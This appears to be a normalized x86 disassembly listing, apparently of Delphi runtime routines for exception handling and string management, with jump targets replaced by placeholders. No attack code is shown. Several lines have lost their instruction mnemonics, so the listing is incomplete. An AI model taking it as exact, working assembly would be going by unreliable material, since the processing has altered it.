lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edi [ edi - 0x24 ]
mov eax [ esi ]
test edi edi
jne r-xdata
mov eax [ eax - 0x2c ]
mov edx [ edi - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
mov edi [ edi ]
add esi 0x8
dec ebx
jne r-xdata
inc eax
inc edx
call sub_402bf8
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
jmp r-xdata
sub_4039a8
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test [ eax + 0x4 ] 0x6
je r-xdata
mov eax 0x1
retn
mov ecx [ edx + 0x4 ]
mov [ edx + 0x4 ] r-xdata
push ebx
push esi
push edi
push ebp
mov ebp [ edx + 0x8 ]
add ecx 0x5
call sub_403690
call ecx
pop ebp
pop edi
pop esi
pop ebx
sub_4039e0
or eax eax
jne r-xdata
pop edx
push esp
push ebp
push edi
push esi
push ebx
push eax
push edx
push esp
push 0x7
push 0x1
push 0xeedfade
push edx
jmp [ rw-data ]
mov eax 0xd8
call sub_403f98
sub_403a08
mov eax [ esp + 0x30 ]
mov [ eax + 0x4 ] r-xdata
call sub_406138
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0xc ]
and [ eax + 0x4 ] 0xfffffffd
cmp [ eax ] 0xeedfade
je r-xdata
xor eax eax
add esp 0x14
mov edx [ fs : eax ]
pop ecx
mov edx [ edx ]
mov [ ecx ] edx
pop ebp
pop edi
pop esi
pop ebx
mov eax 0x1
retn
mov eax [ edx + 0x8 ]
call sub_403254
call sub_4035f0
sub_403a5c
call sub_406138
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0x8 ]
call sub_403254
pop edx
mov esp [ esp + 0x2c ]
xor eax eax
pop ecx
mov [ fs : eax ] ecx
pop eax
pop ebp
call sub_4036b8
jmp edx
sub_403aa4
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0xcf
jmp r-xdata
cmp eax 0xc000008e
jg r-xdata
mov al 0xca
jmp r-xdata
sub eax 0x3d
je r-xdata
mov al 0xda
jmp r-xdata
sub eax 0xc0000093
je r-xdata
and eax 0xff
mov edx [ edx + 0xc ]
call sub_4028c8
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd9
jmp r-xdata
jmp r-xdata
mov al 0xce
jmp r-xdata
dec eax
je r-xdata
je r-xdata
mov al 0xc8
jmp r-xdata
sub eax 0xc0000005
je r-xdata
mov al 0xff
mov al 0xc8
jmp r-xdata
dec eax
je r-xdata
mov al 0xcd
jmp r-xdata
jmp r-xdata
mov al 0xd8
jmp r-xdata
sub eax 0x87
je r-xdata
mov al 0xd7
jmp r-xdata
jmp r-xdata
mov al 0xc9
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
sub_403c04
xor edx edx
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
mov ecx [ fs : edx ]
cmp eax ecx
jne r-xdata
cmp ecx 0xffffffff
je r-xdata
mov eax [ eax ]
mov [ fs : edx ] eax
retn
cmp [ ecx ] eax
jne r-xdata
mov ecx [ ecx ]
mov eax [ eax ]
mov [ ecx ] eax
sub_403c2c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov ebx [ edi + 0xc ]
mov esi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403c72
push [ fs : edx ]
mov [ fs : edx ] esp
test ebx ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec ebx
mov [ edi + 0xc ] ebx
mov eax [ esi + ebx * 8 + 0x4 ]
test eax eax
je r-xdata
test ebx ebx
jg r-xdata
call eax
sub_403c8c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ eax ]
xor ebx ebx
mov edi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403cd2
push [ fs : edx ]
mov [ fs : edx ] esp
cmp esi ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ edi + ebx * 8 ]
inc ebx
mov [ rw-data ] ebx
test eax eax
je r-xdata
cmp esi ebx
jg r-xdata
call eax
sub_403d2c
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
add eax ebx
add edx ebx
call sub_405ecc
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403d50
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add edx ebx
call sub_405ecc
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403d78
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add eax [ esi + 0x8 ]
mov [ edx + ebx ] eax
add esi 0xc
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403d9c
push ebx
push esi
push edi
mov esi rw-data
mov cl 0x10
mov ebx [ rw-data ]
mov eax ebx
mov edi 0xa
cdq
idiv edi
add dl 0x30
xor eax eax
mov al cl
mov [ esi + eax ] dl
mov eax ebx
mov ebx 0xa
cdq
idiv ebx
mov ebx eax
dec ecx
test ebx ebx
jne r-xdata
mov cl 0x1c
mov eax [ rw-data ]
mov edx eax
and edx 0xf
mov dl [ edx + rw-data ]
xor ebx ebx
mov bl cl
mov [ esi + ebx ] dl
shr eax 0x4
dec ecx
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_403df8
xor eax eax
xchg [ rw-data ] eax
neg eax
sbb eax eax
inc eax
mov edi rw-data
mov ebx [ edi + 0x18 ]
mov ebp [ edi + 0x14 ]
push [ edi + 0x1c ]
push [ edi + 0x20 ]
mov esi [ edi ]
mov ecx 0xb
[ edi ] [ esi ]
pop edi
pop esi
leave
retn 0xc
sub_403e28
push ecx
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0xd7b2
jne r-xdata
pop edx
retn
push 0x0
push rw-data
push rw-data
push 0x0
call sub_401334
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x1e
push rw-data
push 0xfffffff5
call sub_4012fc
push eax
call sub_40131c
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff5
call sub_4012fc
push eax
call sub_40131c
pop edx
retn
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax rw-data
call [ rw-data ]
sub_403eb4
push ebx
push esi
push edi
push ebp
mov ebx rw-data
mov esi rw-data
mov edi rw-data
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp [ ebx + 0x28 ] 0x2
jne r-xdata
call sub_403d9c
call sub_403e28
xor eax eax
mov [ rw-data ] eax
mov edx [ edi ]
mov eax edx
xor edx edx
mov [ edi ] edx
mov ebp eax
call ebp
cmp [ edi ] 0x0
jne r-xdata
call sub_403c2c
cmp [ ebx + 0x28 ] 0x1
jbe r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
cmp [ esi ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
call sub_403c04
cmp [ ebx + 0x28 ] 0x1
jne r-xdata
call sub_405998
mov edx [ ebx + 0x10 ]
mov eax [ edx + 0x10 ]
cmp eax [ edx + 0x4 ]
je r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
call [ ebx + 0x24 ]
test eax eax
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
call sub_403df8
push eax
call sub_40134c
mov eax [ ebx ]
push esi
mov esi eax
mov edi ebx
mov ecx 0xb
[ edi ] [ esi ]
pop esi
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esi ]
push eax
call ExitProcess
call [ rw-data ]
sub_403fa4
mov edx [ eax ]
test edx edx
je r-xdata
retn
mov [ eax ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
jne r-xdata
push eax
lea eax [ edx - 0x8 ]
call sub_4027e4
pop eax
sub_403fc8
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4027e4
sub_403ff8
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jg r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
push eax
push edx
mov eax [ edx - 0x4 ]
call sub_404068
mov edx eax
pop eax
push edx
mov ecx [ eax - 0x4 ]
call sub_4029c0
pop edx
pop eax
jmp r-xdata
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4027e4
sub_40403c
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jle r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4027e4
sub_404068
test eax eax
jle r-xdata
xor eax eax
retn
push eax
add eax 0xa
and eax 0xfffffffe
push eax
call sub_4027c4
pop edx
mov [ edx + eax - 0x2 ] 0x0
add eax 0x8
pop edx
mov [ eax - 0x4 ] edx
mov [ eax - 0x8 ] 0x1
retn
sub_404094
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
mov eax edi
call sub_404068
mov ecx edi
mov edi eax
test esi esi
je r-xdata
mov eax ebx
call sub_403fa4
mov [ ebx ] edi
pop edi
pop esi
pop ebx
retn
mov edx eax
mov eax esi
call sub_4029c0
sub_4040c4
push ebp
mov ebp esp
push 0x0
push 0x0
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call WideCharToMultiByte
pop ebp
retn 0x4
sub_4040e4
push ebp
mov ebp esp
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call sub_4013ac
pop ebp
retn 0x4
sub_404100
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_403fa4
jmp r-xdata
mov ebx ebp
add ebx ebx
mov eax edi
mov edx ebx
call sub_4045f0
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_4040c4
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0xfff
call sub_4040c4
mov ebx eax
test ebx ebx
jl r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_4045f0
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_404094
jmp r-xdata
sub_40419c
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404094
push edx
mov ecx edx
pop edx
sub ecx edx
cmp cl [ edx + 0x1 ]
je r-xdata
inc edx
cmp cl [ edx + 0x2 ]
je r-xdata
inc edx
cmp cl [ edx + 0x3 ]
je r-xdata
inc edx
add edx 0x4
jmp r-xdata
cmp cl [ edx ]
je r-xdata
sub_4041cc
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404100
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_404214
push edi
push eax
push ecx
mov edi edx
xor eax eax
[ edi ]
jne r-xdata
pop eax
add ecx eax
pop eax
pop edi
jmp sub_404094
not ecx
sub_404240
push ebx
test edx edx
je r-xdata
mov [ eax ] 0x0
pop ebx
retn
mov ebx [ edx - 0x4 ]
test ebx ebx
je r-xdata
cmp ecx ebx
jl r-xdata
mov [ eax ] cl
inc eax
xchg edx eax
call sub_4029c0
pop ebx
retn
mov ecx ebx
sub_40426c
test edx edx
je r-xdata
retn
mov ecx [ eax ]
test ecx ecx
je sub_403ff8
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi [ ecx - 0x4 ]
mov edx [ esi - 0x4 ]
add edx edi
cmp esi ecx
je r-xdata
call sub_4045f0
mov eax [ ebx ]
mov ecx edi
jmp r-xdata
call sub_4045f0
mov eax esi
mov ecx [ esi - 0x4 ]
mov edx [ ebx ]
add edx edi
call sub_4029c0
pop edi
pop esi
pop ebx
retn
sub_4042b0
test edx edx
je r-xdata
mov edx ecx
jmp sub_403ff8
test ecx ecx
je sub_403ff8
cmp edx [ eax ]
je r-xdata
mov edx ecx
jmp sub_40426c
cmp ecx [ eax ]
je r-xdata
push ebx
push esi
push edi
mov ebx edx
mov esi ecx
push eax
mov eax [ ebx - 0x4 ]
add eax [ esi - 0x4 ]
call sub_404068
mov edi eax
mov edx eax
mov eax ebx
mov ecx [ ebx - 0x4 ]
call sub_4029c0
mov edx edi
mov eax esi
mov ecx [ esi - 0x4 ]
add edx [ ebx - 0x4 ]
call sub_4029c0
pop eax
mov edx edi
test edi edi
je r-xdata
push eax
push ecx
call sub_403ff8
pop edx
pop eax
jmp sub_40426c
call sub_403ff8
pop edi
pop esi
pop ebx
retn
dec [ edi - 0x8 ]
sub_404324
push ebx
push esi
push edi
push edx
push eax
mov ebx edx
xor edi edi
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
xor eax eax
cmp [ eax ] ecx
jne r-xdata
dec edx
jne r-xdata
add eax [ ecx - 0x4 ]
cmp edi ecx
jne r-xdata
mov edi ecx
mov eax [ ecx - 0x4 ]
dec edx
jmp r-xdata
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
test edi edi
je r-xdata
xor edi edi
call sub_404068
push eax
mov esi eax
mov edx eax
mov eax [ esp ]
mov esi [ edi - 0x4 ]
call sub_4045f0
mov edi [ esp ]
push [ edi ]
add esi [ edi ]
dec ebx
jmp r-xdata
dec ebx
jne r-xdata
mov ecx [ eax - 0x4 ]
add esi ecx
call sub_4029c0
mov eax [ esp + ebx * 4 + 0x18 ]
mov edx esi
test eax eax
je r-xdata
pop edx
pop eax
test edi edi
jne r-xdata
pop edx
pop edi
pop esi
pop ebx
pop eax
lea esp [ esp + edx * 4 ]
jmp eax
test edx edx
je r-xdata
call sub_403ff8
dec [ edx - 0x8 ]
sub_4043b0
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp cl bl
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
cmp ch bh
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
and ebx 0xff0000
and ecx 0xff0000
cmp ecx ebx
jne r-xdata
sub_404470
mov edx [ eax ]
test edx edx
je r-xdata
mov eax edx
retn
mov ecx [ edx - 0x8 ]
dec ecx
je r-xdata
push ebx
mov ebx eax
mov eax [ edx - 0x4 ]
call sub_404068
mov edx eax
mov eax [ ebx ]
mov [ ebx ] edx
push eax
mov ecx [ eax - 0x4 ]
call sub_4029c0
pop eax
mov ecx [ eax - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
pop ebx
[ eax - 0x8 ]
jne r-xdata
lea eax [ eax - 0x8 ]
call sub_4027e4
sub_4044c4
push ebx
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
call sub_403fa4
mov ebx [ eax - 0x4 ]
test ebx ebx
je r-xdata
dec edx
jl r-xdata
xor edx edx
jmp r-xdata
cmp edx ebx
jge r-xdata
sub ebx edx
test ecx ecx
jl r-xdata
cmp ecx ebx
jg r-xdata
mov ecx ebx
jmp r-xdata
add edx eax
mov eax [ esp + 0x8 ]
call sub_404094
jmp r-xdata
pop ebx
retn 0x4
sub_404504
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
call j_sub_404470
mov edx [ ebx ]
test edx edx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ edx - 0x4 ]
dec esi
jl r-xdata
cmp esi ecx
jge r-xdata
test edi edi
jle r-xdata
sub ecx esi
cmp edi ecx
jle r-xdata
sub ecx edi
add edx esi
lea eax [ edi + edx ]
call sub_4029c0
mov edx [ ebx ]
mov eax ebx
mov edx [ edx - 0x4 ]
sub edx edi
call sub_4045f0
mov edi ecx
sub_40454c
test eax eax
je r-xdata
retn
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov edx [ edx ]
push edx
test edx edx
je r-xdata
dec edi
jge r-xdata
mov edx [ edx - 0x4 ]
cmp edi edx
jle r-xdata
xor edi edi
mov ebp [ ebx - 0x4 ]
mov eax esi
add edx ebp
call sub_4045f0
pop eax
cmp eax ebx
jne r-xdata
mov edi edx
mov eax [ esi ]
lea edx [ edi + ebp ]
mov ecx [ eax - 0x4 ]
sub ecx edx
add edx eax
add eax edi
call sub_4029c0
mov eax ebx
mov edx [ esi ]
mov ecx ebp
add edx edi
call sub_4029c0
pop ebp
pop edi
pop esi
pop ebx
mov ebx [ esi ]
sub_4045a8
test eax eax
je r-xdata
retn
test edx edx
je r-xdata
xor eax eax
retn
push ebx
push esi
push edi
mov esi eax
mov edi edx
mov ecx [ edi - 0x4 ]
push edi
mov edx [ esi - 0x4 ]
dec edx
js r-xdata
pop edx
xor eax eax
jmp r-xdata
mov al [ esi ]
inc esi
sub ecx edx
jle r-xdata
pop edi
pop esi
pop ebx
[ edi ]
jne r-xdata
mov ebx ecx
push esi
push edi
mov ecx edx
[ esi ] [ edi ]
pop edi
pop esi
je r-xdata
pop edx
mov eax edi
sub eax edx
mov ecx ebx
jmp r-xdata
sub_4045f0
push ebx
push esi
push edi
mov ebx eax
mov esi edx
xor edi edi
test edx edx
jle r-xdata
mov eax ebx
call sub_403fa4
mov [ ebx ] edi
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax edx
call sub_404068
mov edi eax
mov eax [ ebx ]
test eax eax
je r-xdata
cmp [ eax - 0x8 ] 0x1
jne r-xdata
mov edx edi
mov ecx [ eax - 0x4 ]
cmp ecx esi
jl r-xdata
sub eax 0x8
add edx 0x9
push eax
mov eax esp
call sub_402804
pop eax
add eax 0x8
mov [ ebx ] eax
mov [ eax - 0x4 ] esi
mov [ esi + eax ] 0x0
jmp r-xdata
call sub_4029c0
mov ecx esi
pop edi
pop esi
pop ebx
retn
sub_404654
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
mov eax ecx
call sub_403fa4
test esi esi
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_404068
mov [ edi ] eax
mov edx esi
mov cl bl
call sub_402c68
sub_4046c8
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
push eax
call sub_4013ec
mov eax [ ebx ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
sub_4046ec
test edx edx
je sub_4046b0
mov ecx [ edx - 0x4 ]
shr ecx 0x1
je sub_4046b0
push ecx
push edx
push eax
call SysReAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402920
retn
sub_404710
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_4046b0
jmp r-xdata
mov ebx ebp
mov eax edi
mov edx ebx
call sub_4048f8
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_4040e4
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0x7ff
call sub_4040e4
mov ebx eax
test ebx ebx
jle r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_4048f8
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_40479c
jmp r-xdata
sub_40479c
test ecx ecx
je sub_4046b0
push eax
push ecx
push edx
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402920
pop edx
push [ edx ]
mov [ edx ] eax
call sub_4013ec
retn
sub_4047c0
xor ecx ecx
test edx edx
je r-xdata
jmp sub_40479c
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_404828
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x2
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cx [ esi ]
mov bx [ edi ]
cmp cx bx
jne r-xdata
pop edx
cmp cx bx
jne r-xdata
dec edx
je r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cx bx
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
jmp r-xdata
sub_4048ac
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_40481c
cmp ebx 0x1
jge r-xdata
dec ebx
cmp eax ebx
jge r-xdata
xor ebx ebx
jmp r-xdata
test edi edi
jge r-xdata
mov ebx eax
sub eax ebx
cmp edi eax
jge r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
add edx edx
add edx esi
mov ecx [ ebp + 0x8 ]
xchg ecx eax
call sub_40479c
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax edi
sub_4048f8
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor ebx ebx
test esi esi
jle r-xdata
mov eax edi
mov edx ebx
call sub_4046a0
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_404688
mov ebx eax
mov eax [ edi ]
call sub_40481c
test eax eax
jle r-xdata
cmp esi eax
jge r-xdata
mov ecx eax
add ecx ecx
mov edx ebx
mov eax [ edi ]
call sub_4029c0
mov eax esi
sub_40493c
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_40496c
add esi 0x8
dec edi
jg r-xdata
pop edi
pop esi
pop ebx
retn
sub_40496c
test ecx ecx
je r-xdata
retn
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
xor ecx ecx
cmp al 0xa
je r-xdata
mov [ ebx ] ecx
add ebx 0x4
dec edi
jg r-xdata
cmp al 0xb
je r-xdata
jmp r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
mov [ ebx ] ecx
mov [ ebx + 0x4 ] ecx
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0xc ] ecx
add ebx 0x10
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_40496c
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_40493c
dec edi
jg r-xdata
pop ebp
cmp al 0x11
je r-xdata
mov al 0x2
pop edi
pop esi
pop ebx
jmp sub_402920
sub_404a0c
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_404a58
add esi 0x8
dec edi
jg r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_404a58
cmp ecx 0x0
je r-xdata
retn
push eax
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
cmp al 0xa
je r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xb
je r-xdata
mov edx ecx
call sub_403fc8
jmp r-xdata
call sub_403fa4
jmp r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
pop eax
mov edx ecx
call sub_4046c8
jmp r-xdata
call sub_4046b0
jmp r-xdata
mov eax ebx
add ebx 0x10
call sub_404a40
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_404a58
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_404a0c
dec edi
jg r-xdata
pop ebp
jmp r-xdata
mov eax ebx
add ebx 0x4
call sub_405a08
dec edi
jg r-xdata
cmp al 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
add ebx 0x4
call sub_405328
dec edi
jg r-xdata
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
pop eax
mov al 0x2
jmp sub_402920
sub_404b68
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
xor eax eax
mov al [ ecx + 0x1 ]
lea edi [ eax + ecx + 0xa ]
mov ebp [ edi - 0x4 ]
xor eax eax
mov ecx [ edi - 0x8 ]
push ecx
mov eax [ edi + 0x4 ]
mov edx [ edi ]
mov edx [ edx ]
mov cl [ edx ]
cmp cl 0xa
je r-xdata
mov edx eax
add eax esi
add edx ebx
call sub_4029c0
mov edx [ eax + esi ]
add eax ebx
call sub_403ff8
mov eax 0x4
jmp r-xdata
cmp cl 0xb
je r-xdata
add eax [ edi + 0x4 ]
add edi 0x8
dec ebp
jne r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_4046ec
mov eax 0x4
jmp r-xdata
cmp cl 0xc
je r-xdata
mov ecx [ edi + 0x4 ]
sub ecx eax
jle r-xdata
